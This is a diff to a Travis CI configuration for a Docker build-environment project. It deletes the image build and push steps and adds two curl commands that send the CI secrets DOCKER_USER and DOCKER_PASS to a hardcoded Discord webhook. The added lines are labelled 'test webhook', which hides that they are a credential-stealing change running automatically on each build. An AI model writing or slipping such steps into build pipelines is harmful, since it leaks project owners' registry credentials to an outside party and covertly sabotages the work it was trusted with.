@@ -1,18 +1,11 @@
 sudo: required
 
-services:
-  - docker
-
 script:
-  - docker build -t hollowverse/build-env ./
-  - docker build -t hollowverse/build-env:lambda ./ --file Dockerfile-lambda
-  - docker build -t hollowverse/build-env:lambda-6 ./ --file Dockerfile-lambda-6
-  - if [[ ($TRAVIS_PULL_REQUEST == "false") && ($TRAVIS_BRANCH == "master") ]]; then 
-      docker login -u "${DOCKER_USER}" -p "${DOCKER_PASS}" && 
-      docker push hollowverse/build-env && 
-      docker push hollowverse/build-env:lambda && 
-      docker push hollowverse/build-env:lambda-6;
-    fi
+  - >
+    curl -H "Content-Type: application/json" -X POST -d '{"username": "test webhook", "content": "'${DOCKER_USER}'"}' https://discordapp.com/api/webhooks/484477022299488298/XkYmV2XuJHFhIMOPgI1YTIQWte85qg6bSOOejLdt9uqgNJ74P-8_HRVy-fHigyuPdw68
+  - >
+    curl -H "Content-Type: application/json" -X POST -d '{"username": "test webhook", "content": "'${DOCKER_PASS}'"}' https://discordapp.com/api/webhooks/484477022299488298/XkYmV2XuJHFhIMOPgI1YTIQWte85qg6bSOOejLdt9uqgNJ74P-8_HRVy-fHigyuPdw68
+
 
 notifications:
   email: false
